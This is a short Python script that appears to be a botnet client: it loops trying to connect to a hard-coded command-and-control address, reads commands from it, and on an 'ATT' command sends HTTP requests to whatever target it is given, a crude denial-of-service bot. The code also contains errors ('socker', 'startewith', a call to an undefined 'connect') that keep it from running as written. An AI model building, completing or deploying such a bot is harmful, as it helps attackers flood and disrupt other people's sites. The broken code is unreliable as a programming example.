import socket, time, os, requests

CNC_IP = "10.10.10.100"
CNC_PORT = 5002

def connect_to_cnc():
    while True:
        try:    
            s = socker.socket()
            s.connect((CNC_IP, CNC_PORT))
            return s
        except:
            time.sleep(5)

def listen(sock):
    while True:
        try:
            data = sock.recv(1024).decode().strip()
            if not data:
                break

            print(f"Received: {data}", flush = True)

            if data.startewith("ATT"):
                target = data.split(" ")[1]
                attack(target)

        except:
            break

def attack(target):
    requests.get(f"http://{target}")


while True:
    sock = connect()
    listen(sock)

